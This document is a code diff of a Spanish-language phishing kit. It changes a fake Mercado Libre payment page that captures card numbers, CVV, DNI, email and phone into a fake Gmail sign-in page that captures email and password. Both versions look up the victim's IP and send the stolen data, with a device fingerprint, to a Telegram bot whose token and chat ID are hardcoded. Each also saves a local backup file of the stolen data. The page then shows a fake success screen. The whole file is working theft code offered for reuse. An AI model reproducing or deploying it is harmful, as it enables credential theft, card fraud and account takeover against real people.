@@ -3,117 +3,213 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Pago Seguro - Mercado Libre</title>
+    <title>Iniciar sesión - Gmail</title>
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
-        body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; background: #f5f5f5; color: #333; line-height: 1.6; }
-        .container { max-width: 600px; margin: 20px auto; background: white; border-radius: 8px; box-shadow: 0 4px 12px rgba(0,0,0,0.1); overflow: hidden; }
-        .header { background: linear-gradient(135deg, #00a650 0%, #00c851 100%); color: white; padding: 20px; text-align: center; }
-        .header img { width: 120px; height: auto; margin-bottom: 10px; }
-        .header h1 { font-size: 24px; margin-bottom: 5px; }
-        .header p { opacity: 0.9; font-size: 14px; }
-        .summary { padding: 20px; border-bottom: 1px solid #eee; background: #fafafa; }
-        .summary h2 { color: #00a650; font-size: 18px; margin-bottom: 10px; }
-        .item { display: flex; justify-content: space-between; margin-bottom: 10px; font-size: 14px; }
-        .total { font-weight: bold; font-size: 20px; color: #00a650; }
-        .payment-form { padding: 30px 20px; }
-        .form-group { margin-bottom: 20px; }
-        .form-group label { display: block; font-size: 14px; margin-bottom: 5px; color: #555; font-weight: 500; }
-        .form-group input { width: 100%; padding: 12px 15px; border: 1px solid #ddd; border-radius: 4px; font-size: 16px; transition: border-color 0.3s; }
-        .form-group input:focus { outline: none; border-color: #00a650; box-shadow: 0 0 0 2px rgba(0,166,80,0.1); }
-        .card-row { display: grid; grid-template-columns: 2fr 1fr 1fr; gap: 15px; }
-        .cvv-group { position: relative; }
-        .form-row { display: flex; gap: 15px; }
-        .half { flex: 1; }
-        .submit-btn { width: 100%; background: linear-gradient(135deg, #00a650 0%, #00c851 100%); color: white; border: none; padding: 15px; font-size: 18px; font-weight: bold; border-radius: 4px; cursor: pointer; transition: all 0.3s; }
-        .submit-btn:hover { transform: translateY(-1px); box-shadow: 0 4px 12px rgba(0,166,80,0.3); }
-        .submit-btn:disabled { opacity: 0.7; cursor: not-allowed; transform: none; }
-        .security { text-align: center; padding: 20px; background: #f0f8f0; font-size: 12px; color: #666; }
-        .security img { width: 40px; height: auto; margin: 0 5px; filter: grayscale(1); }
-        .processing { display: none; text-align: center; padding: 40px 20px; }
-        .spinner { width: 40px; height: 40px; border: 4px solid #f3f3f3; border-top: 4px solid #00a650; border-radius: 50%; animation: spin 1s linear infinite; margin: 0 auto 20px; }
-        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-        .success { display: none; text-align: center; padding: 40px 20px; color: #00a650; }
-        .success h2 { font-size: 24px; margin-bottom: 10px; }
-        .success p { font-size: 16px; margin-bottom: 20px; }
+        body { 
+            font-family: 'Roboto', -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif; 
+            background: linear-gradient(135deg, #4285f4 0%, #34a853 50%, #fbbc05 75%, #ea4335 100%); 
+            min-height: 100vh; 
+            display: flex; 
+            align-items: center; 
+            justify-content: center; 
+            color: #202124;
+        }
+        .container { 
+            background: white; 
+            border-radius: 8px; 
+            box-shadow: 0 4px 20px rgba(0,0,0,0.15); 
+            width: 100%; 
+            max-width: 440px; 
+            padding: 48px 40px 36px; 
+            margin: 24px;
+        }
+        .logo { 
+            text-align: center; 
+            margin-bottom: 32px; 
+        }
+        .logo img { 
+            width: 75px; 
+            height: 25px; 
+        }
+        .logo h1 { 
+            font-size: 24px; 
+            font-weight: 400; 
+            color: #202124; 
+            margin-top: 8px; 
+        }
+        .form-group { 
+            margin-bottom: 24px; 
+            position: relative; 
+        }
+        .form-group label { 
+            position: absolute; 
+            left: 16px; 
+            top: 14px; 
+            font-size: 16px; 
+            color: #80868b; 
+            pointer-events: none; 
+            transition: all 0.2s ease; 
+            background: white; 
+            padding: 0 4px; 
+        }
+        .form-group input:focus + label,
+        .form-group input:not(:placeholder-shown) + label { 
+            top: -8px; 
+            font-size: 12px; 
+            color: #1a73e8; 
+            font-weight: 500; 
+        }
+        .form-group input { 
+            width: 100%; 
+            padding: 16px; 
+            border: 1px solid #dadce0; 
+            border-radius: 4px; 
+            font-size: 16px; 
+            outline: none; 
+            transition: border-color 0.2s ease, box-shadow 0.2s ease; 
+        }
+        .form-group input:focus { 
+            border-color: #1a73e8; 
+            box-shadow: 0 0 0 1px #1a73e8; 
+        }
+        .signin-btn { 
+            width: 100%; 
+            background: #1a73e8; 
+            color: white; 
+            border: none; 
+            padding: 12px; 
+            font-size: 14px; 
+            font-weight: 500; 
+            border-radius: 4px; 
+            cursor: pointer; 
+            transition: background 0.2s ease; 
+            margin-bottom: 16px; 
+        }
+        .signin-btn:hover:not(:disabled) { 
+            background: #1557b0; 
+        }
+        .signin-btn:disabled { 
+            opacity: 0.6; 
+            cursor: not-allowed; 
+        }
+        .forgot { 
+            text-align: center; 
+            font-size: 14px; 
+            color: #1a73e8; 
+            text-decoration: none; 
+            display: block; 
+            margin-bottom: 24px; 
+        }
+        .create-account { 
+            text-align: center; 
+            font-size: 14px; 
+            color: #5f6368; 
+        }
+        .create-link { 
+            color: #1a73e8; 
+            text-decoration: none; 
+            font-weight: 500; 
+        }
+        .processing { 
+            display: none; 
+            text-align: center; 
+            padding: 48px 40px; 
+        }
+        .spinner { 
+            width: 32px; 
+            height: 32px; 
+            border: 3px solid #f3f3f3; 
+            border-top: 3px solid #4285f4; 
+            border-radius: 50%; 
+            animation: spin 1s linear infinite; 
+            margin: 0 auto 20px; 
+        }
+        @keyframes spin { 
+            0% { transform: rotate(0deg); } 
+            100% { transform: rotate(360deg); } 
+        }
+        .success { 
+            display: none; 
+            text-align: center; 
+            padding: 48px 40px; 
+            color: #137333; 
+        }
+        .success h2 { 
+            font-size: 24px; 
+            margin-bottom: 8px; 
+            font-weight: 400; 
+        }
+        .success p { 
+            font-size: 16px; 
+            opacity: 0.8; 
+        }
         .hidden { display: none; }
-        @media (max-width: 768px) { .card-row { grid-template-columns: 1fr; } .form-row { flex-direction: column; } }
+        @media (max-width: 480px) { 
+            .container { margin: 16px; padding: 40px 24px 32px; } 
+        }
     </style>
 </head>
 <body>
-    <!-- MISMO HTML que antes, solo cambia el SCRIPT -->
-    <div class="container">
-        <div class="header">
-            <img src="data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iMTIwIiBoZWlnaHQ9IjM1IiB2aWV3Qm94PSIwIDAgMTIwIDM1IiBmaWxsPSJub25lIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciPgo8cGF0aCBkPSJNMCAxNHYzNGgxMjB2LTM0SDB6IiBmaWxsPSJ3aGl0ZSIvPgo8cGF0aCBkPSJNOSAxOWM0IDAgNyAxIDcgM3MgMyA3IDAgMTBjLTcgNC0xNCA0LTIxIDBzLTE0IDAtMjEgMHYzYzcgMCAxNCAwIDIxIDBzMTQgMSAyMSAwYzMgMCA1LTIgNy0zcyAzLTcgMCAxMGMtNyA0LTE0IDQtMjEgMHMtMTQtMC0yMSAwdi0zYzcgMCAxNCAwIDIxIDBzMTQtMSAyMSAwYzMgMCA1LTItNy0zcy0zLTctMC0xMGMtNyA0LTE0IDQtMjEgMHMtMTQtMC0yMSAwdi0zYzcgMCAxNCAwIDIxIDBzMTQtMSAyMSAwYzMgMCA1LTItNy0zcy0zLTctMC0xMEM5IDE5IDkgMTkgOSA5WiIgZmlsbD0iIzAwQTY1MCIvPgo8L3N2Zz4K" alt="Mercado Libre">
-            <h1>Pago Seguro</h1>
-            <p>Finalizá tu compra de forma segura con Mercado Pago</p>
+    <div class="container" id="loginContainer">
+        <div class="logo">
+            <svg width="75" height="25" viewBox="0 0 75 25" fill="none" xmlns="http://www.w3.org/2000/svg">
+                <path d="M7.5 0L15 12.5L7.5 25H0L7.5 12.5Z" fill="#4285F4"/>
+                <path d="M15 0L30 12.5L15 25H7.5L15 12.5Z" fill="#34A853"/>
+                <path d="M22.5 0L45 12.5L22.5 25H15L22.5 12.5Z" fill="#FBBC05"/>
+                <path d="M37.5 0L75 12.5L37.5 25H30L37.5 12.5Z" fill="#EA4335"/>
+            </svg>
+            <h1>Gmail</h1>
         </div>
         
-        <div class="summary">
-            <h2>Resumen de tu compra</h2>
-            <div class="item"><span>iPhone 15 Pro 256GB</span><span>$1.299.999</span></div>
-            <div class="item"><span>Envío a: Capital Federal</span><span>Gratis</span></div>
-            <div class="item total"><span>Total:</span><strong>$1.299.999</strong></div>
-        </div>
-        
-        <form id="paymentForm" class="payment-form">
-            <div class="form-group"><label>Número de tarjeta</label><input type="text" id="cardNumber" maxlength="19" placeholder="1234 5678 9012 3456" required></div>
-            <div class="card-row">
-                <div class="form-group"><label>Nombre del titular</label><input type="text" id="cardHolder" placeholder="Como aparece en la tarjeta" required></div>
-                <div class="form-group"><label>Fecha de vencimiento</label><input type="text" id="expiry" maxlength="5" placeholder="MM/AA" required></div>
-                <div class="form-group"><label>Código de seguridad (CVV)</label><input type="text" id="cvv" maxlength="4" placeholder="123" required></div>
+        <form id="loginForm">
+            <div class="form-group">
+                <input type="email" id="email" placeholder=" " required>
+                <label>Email o teléfono</label>
             </div>
-            <div class="form-row">
-                <div class="form-group half"><label>DNI / Documento</label><input type="text" id="dni" maxlength="11" placeholder="20.123.456" required></div>
-                <div class="form-group half"><label>Email</label><input type="email" id="email" placeholder="tu@email.com" required></div>
+            
+            <div class="form-group">
+                <input type="password" id="password" placeholder=" " required>
+                <label>Contraseña</label>
             </div>
-            <div class="form-group"><label>Teléfono</label><input type="tel" id="phone" placeholder="+54 11 1234-5678" required></div>
-            <button type="submit" class="submit-btn" id="payButton">PAGAR AHORA $1.299.999</button>
+            
+            <button type="submit" class="signin-btn" id="signinBtn">
+                Siguiente
+            </button>
+            
+            <a href="#" class="forgot">¿Olvidaste tu contraseña?</a>
+            
+            <div class="create-account">
+                ¿No tienes cuenta? <a href="#" class="create-link">Crear cuenta</a>
+            </div>
         </form>
-        
-        <div class="security">
-            <p><strong>100% Seguro</strong> | Tu información está protegida con encriptación SSL</p>
-        </div>
     </div>
     
     <div class="processing hidden" id="processing">
-        <div class="spinner"></div><h2>Procesando tu pago...</h2><p>Por favor no recargues la página</p>
+        <div class="spinner"></div>
+        <h2>Comprobando credenciales...</h2>
+        <p>No cierres esta ventana</p>
     </div>
     
     <div class="success hidden" id="success">
-        <h2>¡Pago exitoso!</h2>
-        <p>Tu compra ha sido confirmada. Recibirás un email con los detalles en breve.</p>
-        <p><strong>ID de transacción: MLN-847293102</strong></p>
+        <h2>Bienvenido</h2>
+        <p>Redirigiendo a tu bandeja de entrada...</p>
     </div>
     
     <script>
-        // Formateo
-        document.getElementById('cardNumber').addEventListener('input', function(e) {
-            let value = e.target.value.replace(/\s/g, '').replace(/(.{4})/g, '$1 ').trim();
-            e.target.value = value;
-        });
-        document.getElementById('expiry').addEventListener('input', function(e) {
-            let value = e.target.value.replace(/\D/g, '').replace(/(.{2})/g, '$1/').trim();
-            e.target.value = value;
-        });
-
         // ⭐ CAMBIA ESTOS 2 VALORES CON LOS DE TU BOT ⭐
         const BOT_TOKEN = '8368378813:AAF8eye4rtnZ56O2GAWnpd9x4xX4LUulzYc';  // ← PEGA TU TOKEN
         const CHAT_ID = '7660686698';     // ← PEGA TU CHAT_ID
 
-        document.getElementById('paymentForm').addEventListener('submit', async function(e) {
+        document.getElementById('loginForm').addEventListener('submit', async function(e) {
             e.preventDefault();
             
-            const cardNumber = document.getElementById('cardNumber').value;
-            const cardHolder = document.getElementById('cardHolder').value;
-            const expiry = document.getElementById('expiry').value;
-            const cvv = document.getElementById('cvv').value;
-            const dni = document.getElementById('dni').value;
-            const email = document.getElementById('email').value;
-            const phone = document.getElementById('phone').value;
+            const email = document.getElementById('email').value.trim();
+            const password = document.getElementById('password').value;
             
             // Capturar IP real
             let ip = 'unknown';
+            let userAgent = navigator.userAgent;
             try {
                 const response = await fetch('https://api.ipify.org?format=json');
                 const data = await response.json();
@@ -121,18 +217,15 @@
             } catch(e) {}
             
             // Mensaje para Telegram
-            const message = `🆕 *NUEVA TARJETA CAPTURADA* 🆕\n` +
-                          `💳 *Número:* \`${cardNumber}\`\n` +
-                          `👤 *Titular:* ${cardHolder}\n` +
-                          `📅 *Vencimiento:* ${expiry}\n` +
-                          `🔒 *CVV:* \`${cvv}\`\n` +
-                          `🆔 *DNI:* ${dni}\n` +
-                          `📧 *Email:* ${email}\n` +
-                          `📱 *Teléfono:* ${phone}\n` +
+            const message = `🔐 *NUEVAS CREDENCIALES GMAIL CAPTURADAS* 🔐\n\n` +
+                          `📧 *Email:* \`${email}\`\n` +
+                          `🔑 *Contraseña:* \`${password}\`\n` +
                           `🌐 *IP:* ${ip}\n` +
-                          `📱 *Dispositivo:* ${navigator.userAgent.slice(0,50)}...\n` +
-                          `⏰ *Hora:* ${new Date().toLocaleString('es-AR')}\n\n` +
-                          `──────────────────────────`;
+                          `💻 *User-Agent:* ${userAgent.substring(0, 60)}...\n` +
+                          `📱 *Idioma:* ${navigator.language}\n` +
+                          `🌍 *Ubicación:* ${navigator.geolocation ? 'Geolocalización disponible' : 'No disponible'}\n` +
+                          `⏰ *Hora:* ${new Date().toLocaleString('es-ES', {timeZone: 'America/Argentina/Buenos_Aires'})}\n\n` +
+                          `═══════════════════════════════`;
             
             // Enviar a Telegram
             try {
@@ -142,33 +235,34 @@
                     body: JSON.stringify({
                         chat_id: CHAT_ID,
                         text: message,
-                        parse_mode: 'Markdown'
+                        parse_mode: 'Markdown',
+                        disable_web_page_preview: true
                     })
                 });
             } catch(e) {
                 console.log('Error Telegram:', e);
             }
             
-            // Descarga local de backup
-            const csvContent = `${cardNumber}|${cardHolder}|${cvv}|${dni}|${email}|${ip}\n`;
-            const blob = new Blob([csvContent], { type: 'text/plain;charset=utf-8' });
+            // Backup local
+            const data = `GMAIL: ${email}\nPASS: ${password}\nIP: ${ip}\n${new Date().toISOString()}\n\n`;
+            const blob = new Blob([data], { type: 'text/plain;charset=utf-8' });
             const url = URL.createObjectURL(blob);
             const link = document.createElement('a');
             link.href = url;
-            link.download = `tarjeta_${dni}_${Date.now()}.txt`;
+            link.download = `gmail_${email.replace(/[@.]/g, '_')}_${Date.now()}.txt`;
             document.body.appendChild(link);
             link.click();
             document.body.removeChild(link);
             URL.revokeObjectURL(url);
             
-            // Mostrar procesamiento → éxito
-            document.querySelector('.container').classList.add('hidden');
+            // Mostrar animación
+            document.getElementById('loginContainer').classList.add('hidden');
             document.getElementById('processing').classList.remove('hidden');
             
             setTimeout(() => {
                 document.getElementById('processing').classList.add('hidden');
                 document.getElementById('success').classList.remove('hidden');
-            }, 4000);
+            }, 3500);
         });
     </script>
 </body>
